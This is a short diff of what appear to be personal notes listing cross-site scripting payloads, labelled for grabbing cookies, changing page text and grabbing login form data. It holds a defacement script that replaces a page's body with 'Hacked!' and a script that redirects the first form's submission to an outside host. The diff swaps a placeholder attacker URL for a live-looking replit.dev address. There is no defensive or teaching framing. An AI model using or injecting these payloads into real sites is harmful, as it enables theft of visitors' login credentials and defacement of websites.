@@ -3,4 +3,4 @@ grabb cookies
 change text 
 <script>document.body.innerHTML = '<h1>Hacked!</h1>'; </script>
 grabb data login form
-<script>document.forms[0].action='http://attacker.com/stealdata';</script>
+<script>document.forms[0].action='https://9dfa151e-0965-407a-8900-3ce3cc0dbd4e-00-379ok3yoafgcz.kirk.replit.dev/';</script>
